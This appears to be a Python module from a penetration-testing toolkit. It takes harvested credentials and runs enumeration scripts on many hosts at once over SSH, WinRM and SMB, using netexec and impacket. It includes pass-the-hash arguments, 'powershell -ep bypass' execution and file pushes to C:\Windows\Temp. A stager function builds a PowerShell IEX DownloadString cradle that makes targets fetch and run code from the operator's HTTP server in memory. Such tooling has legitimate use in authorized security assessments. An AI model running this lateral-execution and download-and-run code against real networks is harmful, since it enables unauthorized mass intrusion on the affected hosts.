"""Credentialed mass local-enum + priv-esc deployment.

Push recce's read-only on-target enum scripts (recce-enum.sh / recce-enum.ps1)
to every host we have working credentials for, run them, pull the output back,
and hand it to `ingest`. Transport is chosen per host from its open ports + OS:

  SSH   (22)          -> recce-enum.sh piped over stdin (`bash -s`); NOTHING is
                         written to the target's disk, output streams back.
  WinRM (5985/5986)   -> recce-enum.ps1 run in-memory via
                         `nxc winrm -X 'powershell -EncodedCommand ...'` (PSRP,
                         so no cmd.exe length limit and no artifact).
  SMB   (445, admin)  -> recce-enum.ps1 pushed to %TEMP%, run via `nxc smb -x`,
                         then deleted (wmiexec-style; cmd's short line can't hold
                         the whole script, so this transport uses a temp file).

Like the rest of recce it shells out to tools already on Kali - `ssh`/`sshpass`
and `netexec`/`nxc` (the same ones `credenum` uses); recce's own code stays
stdlib-only. The scripts are READ-ONLY: they change nothing on the target, run no
exploit code, and do not evade EDR - if something flags a plain read-only enum
script, coordinate an exclusion.
"""
from __future__ import annotations

import base64
import os
import re
import shutil
import subprocess

from .credenum import impacket_tool, smb_tool
from .models import Host

_SCRIPT_DIR = os.path.join(os.path.dirname(__file__), "local")
LINUX_SCRIPT = os.path.join(_SCRIPT_DIR, "recce-enum.sh")
WINDOWS_SCRIPT = os.path.join(_SCRIPT_DIR, "recce-enum.ps1")

# Per-host exec ceiling (seconds); the enum sweep does a lot of reads.
DEFAULT_TIMEOUT = 300

# Markers that a remote login was REJECTED. Deliberately specific - nxc prints a
# bare "[-]" on a WinRM 401, impacket/Windows use STATUS_* codes. A broad "auth"
# substring is avoided on purpose: it also matches benign "Proxy Authentication
# Required" / "Unauthorized" download errors and would wrongly suppress fallback.
_AUTH_FAIL = ("[-]", "permission denied", "authentication failed",
              "logon_failure", "status_logon_failure", "access_denied",
              "access denied", "rpc_s_access_denied", "sts_error",
              "the attempted logon is invalid", "account restriction")


def _read(path: str) -> str:
    with open(path, "r", errors="replace") as fh:
        return fh.read()


def transport_for(host: Host, ssh_creds, win_creds, authmap=None) -> str | None:
    """Pick a remote-exec transport for this host.

    With an `authmap` (from `validate()` - nxc confirmed which protocols the creds
    actually work on), pick a transport whose creds are PROVEN to authenticate
    (and, for SMB, that we can exec on = admin). Without it, fall back to open
    ports + OS + which cred sets we hold.
    """
    ip = host.ip
    ports = {p.portid for p in host.open_ports}
    svc = {(p.service or "").lower() for p in host.open_ports}
    has_ssh = 22 in ports or "ssh" in svc
    has_winrm = bool(ports & {5985, 5986})
    has_smb = 445 in ports
    is_linux = (host.os_family or "").lower() == "linux"

    if authmap is not None and ip in authmap:
        a = authmap[ip]
        if win_creds and a.get("winrm"):
            return "winrm"
        if win_creds and a.get("smb"):          # smb == exec-capable (admin) here
            return "smb"
        if ssh_creds and a.get("ssh"):
            return "ssh"
        return None                              # creds checked, none worked here

    if win_creds and not (is_linux and has_ssh and ssh_creds):
        if has_winrm:
            return "winrm"
        if has_smb:
            return "smb"
    if ssh_creds and has_ssh:
        return "ssh"
    if win_creds and has_winrm:
        return "winrm"
    if win_creds and has_smb:
        return "smb"
    return None


# --- nxc credential / service validation ----------------------------------------

# nxc line, e.g.  SMB  10.0.10.10  445  DC01  [+] corp\admin:Pw! (Pwn3d!)
_NXC_LINE = re.compile(
    r"\b(SMB|WINRM|SSH)\b.*?(\d{1,3}(?:\.\d{1,3}){3}).*?(\[\+\]|\[-\])(.*)$",
    re.IGNORECASE)


def _parse_nxc_auth(out: str) -> list[tuple[str, bool, bool]]:
    """[(ip, authenticated, admin/pwned)] from an `nxc <proto>` auth sweep."""
    rows = []
    for line in (out or "").splitlines():
        m = _NXC_LINE.search(line)
        if not m:
            continue
        ip = m.group(2)
        ok = m.group(3) == "[+]"
        pwned = "pwn3d" in (m.group(4) or "").lower()
        rows.append((ip, ok, pwned))
    return rows


def _ssh_nxc_auth(base: list, creds: dict) -> list:
    argv = base + ["-u", creds.get("username", "")]
    if creds.get("key"):
        argv += ["--key-file", creds["key"]]
    elif creds.get("password"):
        argv += ["-p", creds["password"]]
    return argv


def validate(targets: list, ssh_creds, win_creds, timeout: int = 240) -> dict:
    """Use nxc to see which protocols the given creds authenticate to across the
    target IPs, so deploy only runs where it truly can. Returns
    {ip: {"smb": bool_admin, "winrm": bool, "ssh": bool}}. Empty if nxc absent."""
    tool = smb_tool()
    authmap: dict[str, dict] = {}
    if not tool or not targets:
        return authmap
    tlist = [str(t) for t in targets]

    def sweep(proto: str, argv: list):
        _, out, _ = _run(argv, timeout)
        for ip, ok, pwned in _parse_nxc_auth(out):
            slot = authmap.setdefault(ip, {})
            # SMB exec needs admin, so record admin-capability for smb; winrm/ssh
            # just need a valid bind.
            slot[proto] = pwned if proto == "smb" else ok

    if win_creds:
        sweep("smb", _nxc_auth([tool, "smb", *tlist], win_creds))
        sweep("winrm", _nxc_auth([tool, "winrm", *tlist], win_creds))
    if ssh_creds:
        sweep("ssh", _ssh_nxc_auth([tool, "ssh", *tlist], ssh_creds))
    return authmap


def _run(argv: list, timeout: int, stdin: str | None = None):
    try:
        p = subprocess.run(argv, input=stdin, capture_output=True, text=True,
                           errors="replace", timeout=timeout)
        return p.returncode, p.stdout or "", p.stderr or ""
    except subprocess.TimeoutExpired:
        return None, "", f"timed out after {timeout}s"
    except FileNotFoundError:
        return None, "", f"{argv[0]} not found on PATH"
    except OSError as e:
        return None, "", str(e)


def _looks_like_auth_fail(out: str, err: str) -> bool:
    blob = f"{out}\n{err}".lower()
    return any(m in blob for m in _AUTH_FAIL)


def _ran_ok(out: str) -> bool:
    """Positive proof the on-target script actually executed (its banner is in the
    output), so a reject banner or an exec error is never folded as a success."""
    return "recce-enum" in (out or "").lower()


# --- SSH (Linux) ----------------------------------------------------------------

def run_ssh(ip: str, creds: dict, script_text: str, timeout: int):
    """Run recce-enum.sh on a Linux host over SSH, script piped via stdin (no file
    dropped). Returns (output|None, error|None)."""
    user = creds.get("username")
    if not user:
        return None, "no ssh username"
    ssh = ["ssh", "-o", "StrictHostKeyChecking=no",
           "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10"]
    prefix: list = []
    if creds.get("key"):
        ssh += ["-o", "BatchMode=yes", "-i", creds["key"]]
    elif creds.get("password"):
        if not shutil.which("sshpass"):
            return None, "sshpass not installed (needed for SSH password auth)"
        ssh += ["-o", "PreferredAuthentications=password",
                "-o", "PubkeyAuthentication=no"]
        prefix = ["sshpass", "-p", creds["password"]]
    else:
        return None, "no ssh key or password"
    # `bash -s -- -q`: read the script from stdin, pass -q (findings only).
    argv = prefix + ssh + [f"{user}@{ip}", "bash -s -- -q"]
    rc, out, err = _run(argv, timeout, stdin=script_text)
    if rc is None:
        return None, err
    if rc != 0 and not out.strip():
        return None, (err.strip().splitlines() or ["ssh failed"])[-1]
    return out, None


# --- Windows (WinRM / SMB via netexec) ------------------------------------------

def _b64_ps(script_text: str) -> str:
    """PowerShell -EncodedCommand payload: base64 of UTF-16LE."""
    return base64.b64encode(script_text.encode("utf-16-le")).decode("ascii")


def _nxc_auth(base: list, creds: dict) -> list:
    argv = base + ["-u", creds.get("username", "")]
    if creds.get("hash"):
        argv += ["-H", creds["hash"]]          # pass-the-hash
    else:
        argv += ["-p", creds.get("password", "")]
    if creds.get("domain"):
        argv += ["-d", creds["domain"]]
    return argv


# --- Windows exec engine: netexec OR impacket -----------------------------------
# nxc is preferred (does WinRM + SMB + --put-file); impacket wmiexec is an
# SMB/WMI exec-only fallback (both expected on Kali). wmiexec pairs cleanly with
# --stager (it runs the download cradle in memory - no file push needed at all).

def win_engine() -> tuple[str | None, str | None]:
    tool = smb_tool()
    if tool:
        return "nxc", tool
    wm = impacket_tool("wmiexec") or impacket_tool("atexec")
    if wm:
        return "impacket", wm
    return None, None


def _impacket_target(creds: dict, ip: str) -> str:
    dom = creds.get("domain") or ""
    prefix = f"{dom}/" if dom else ""
    user = creds.get("username", "")
    if creds.get("hash"):
        return f"{prefix}{user}@{ip}"              # password supplied via -hashes
    return f"{prefix}{user}:{creds.get('password', '')}@{ip}"


def _wmiexec(tool: str, creds: dict, ip: str, command: str, timeout: int):
    argv = [tool]
    if creds.get("hash"):
        argv += ["-hashes", f":{creds['hash']}"]
    argv += [_impacket_target(creds, ip), command]
    return _run(argv, timeout)


def run_winrm(ip: str, creds: dict, script_text: str, timeout: int):
    tool = smb_tool()          # nxc / netexec / crackmapexec
    if not tool:
        return None, "netexec/nxc not installed (needed for WinRM)"
    argv = _nxc_auth([tool, "winrm", ip], creds) + [
        "-X", f"powershell -NoProfile -EncodedCommand {_b64_ps(script_text)}"]
    rc, out, err = _run(argv, timeout)
    if rc is None:
        return None, err
    if _ran_ok(out):
        return out, None
    return None, ("authentication failed / not permitted (WinRM)"
                  if _looks_like_auth_fail(out, err)
                  else "WinRM ran but the script produced no output (creds/policy?)")


def run_smb(ip: str, creds: dict, script_path: str, timeout: int):
    """Push recce-enum.ps1 to %TEMP%, run it, delete it. Needs local-admin. Uses
    nxc `--put-file` if present, else impacket (smbclient put + wmiexec run)."""
    engine, tool = win_engine()
    if not tool:
        return None, "no Windows exec tool (install netexec or impacket)"
    remote_abs = "C:\\Windows\\Temp\\rc_" + ip.replace(".", "_") + ".ps1"
    if engine == "nxc":
        put = _nxc_auth([tool, "smb", ip], creds) + ["--put-file", script_path, remote_abs]
        rc, pout, perr = _run(put, timeout)
        if rc is None:
            return None, perr
        if _looks_like_auth_fail(pout, perr):
            return None, "authentication failed / not admin (SMB put-file)"
        ex = _nxc_auth([tool, "smb", ip], creds) + [
            "-x", f"powershell -ep bypass -File {remote_abs}"]
        _, out, err = _run(ex, timeout)
        _run(_nxc_auth([tool, "smb", ip], creds) + ["-x", f"del {remote_abs}"], 60)
    else:  # impacket: put via smbclient, run via wmiexec, delete
        sc = impacket_tool("smbclient")
        if not sc:
            return None, ("impacket-only SMB push needs impacket-smbclient - install "
                          "it, or use --stager (no file push), or install netexec")
        rel = "Windows\\Temp\\rc_" + ip.replace(".", "_") + ".ps1"
        argv = [sc]
        if creds.get("hash"):
            argv += ["-hashes", f":{creds['hash']}"]
        argv += [_impacket_target(creds, ip)]
        rc, pout, perr = _run(argv, timeout,
                              stdin=f"use C$\nput {script_path} {rel}\nexit\n")
        if rc is None:
            return None, perr
        if _looks_like_auth_fail(pout, perr):
            return None, "authentication failed / not admin (SMB put)"
        _, out, err = _wmiexec(tool, creds, ip,
                               f"powershell -ep bypass -File {remote_abs}", timeout)
        _wmiexec(tool, creds, ip, f"del {remote_abs}", 60)   # best-effort cleanup
    if _ran_ok(out):
        return out, None
    return None, ("authentication failed / not permitted (SMB exec)"
                  if _looks_like_auth_fail(out, err)
                  else "SMB exec produced no script output (not admin / policy?)")


def run_win_stager(ip: str, creds: dict, sub: str, stager, timeout: int):
    """Trigger a Windows host to fetch recce-enum.ps1 from our HTTP stager and run
    it in memory (no temp file, no size limit) via nxc OR impacket wmiexec. Returns
    (output|None, error|None, status) - 'ok' | 'unreachable' | 'authfail' | 'tool'."""
    engine, tool = win_engine()
    if not tool:
        return None, "no Windows exec tool (install netexec or impacket)", "tool"
    cradle = f"IEX (New-Object Net.WebClient).DownloadString('{stager.url('recce-enum.ps1')}')"
    ps = f"powershell -NoProfile -EncodedCommand {_b64_ps(cradle)}"
    if engine == "nxc":
        flag = "-X" if sub == "winrm" else "-x"
        argv = _nxc_auth([tool, sub if sub == "winrm" else "smb", ip], creds) + [flag, ps]
        rc, out, err = _run(argv, timeout)
    else:  # impacket wmiexec runs the cradle over SMB/WMI (no WinRM exec in impacket)
        rc, out, err = _wmiexec(tool, creds, ip, ps, timeout)
    if rc is None:
        return None, err, "unreachable"
    if _ran_ok(out):
        return out, None, "ok"                     # ran; target reached the stager
    if _looks_like_auth_fail(out, err):
        return None, "authentication failed / not permitted", "authfail"
    return None, "target could not reach the stager", "unreachable"


# --- one host -------------------------------------------------------------------

def deploy_one(host: Host, ssh_creds, win_creds, timeout: int = DEFAULT_TIMEOUT,
               stager=None, authmap=None):
    """Run the right on-target enum script on one host via the best transport.
    With `stager`, Windows hosts fetch+run in memory over HTTP and fall back to
    the push path if they can't reach it. Returns (transport|None, out|None,
    error|None)."""
    t = transport_for(host, ssh_creds, win_creds, authmap)
    if t is None:
        return None, None, ("no usable transport (need an open SSH/WinRM/SMB port "
                            "and working credentials)")
    if t == "ssh":
        out, err = run_ssh(host.ip, ssh_creds, _read(LINUX_SCRIPT), timeout)
        return t, out, err
    # impacket has no WinRM exec, so if nxc is absent fall the WinRM pick down to
    # SMB/WMI (as long as 445 is reachable).
    if t == "winrm" and win_engine()[0] == "impacket" and 445 in {p.portid for p in host.open_ports}:
        t = "smb"
    # Windows: try the in-memory HTTP stager first (if enabled), else push.
    if stager is not None:
        out, err, status = run_win_stager(host.ip, win_creds, t, stager, timeout)
        if status == "ok":
            return t + "+http", out, None
        if status in ("authfail", "tool"):
            return t, None, err                     # push won't fix these
        # 'unreachable' -> fall through to the push path
    if t == "winrm":
        out, err = run_winrm(host.ip, win_creds, _read(WINDOWS_SCRIPT), timeout)
    else:
        out, err = run_smb(host.ip, win_creds, WINDOWS_SCRIPT, timeout)
    return t, out, err


def skip_reason(host: Host, ssh_creds, win_creds, authmap=None) -> str:
    """Human-readable WHY transport_for() returned None - so a skipped host reads
    as 'unable to complete because X', not just an unexplained omission."""
    ports = {p.portid for p in host.open_ports}
    svc = {(p.service or "").lower() for p in host.open_ports}
    has_ssh = 22 in ports or "ssh" in svc
    has_winrm = bool(ports & {5985, 5986})
    has_smb = 445 in ports
    if not (has_ssh or has_winrm or has_smb):
        return "no remote-exec port open (need SSH 22 / WinRM 5985 / SMB 445)"
    # There IS a reachable port, so it's a credential problem.
    if authmap is not None and host.ip in authmap:
        return "credentials did not authenticate (nxc precheck: no SMB-admin/WinRM/SSH)"
    need = []
    if has_ssh and not ssh_creds:
        need.append("SSH creds (--ssh-user + --ssh-pass/--ssh-key)")
    if (has_winrm or has_smb) and not win_creds:
        need.append("Windows creds (-u/-p or --hash)")
    if need:
        return "port open but missing " + " and ".join(need)
    return "no usable transport for the credentials given"


def plan(hosts: list, ssh_creds, win_creds, authmap=None) -> list:
    """Preview: [(host, transport|None)] for every host, for --dry-run."""
    return [(h, transport_for(h, ssh_creds, win_creds, authmap)) for h in hosts]
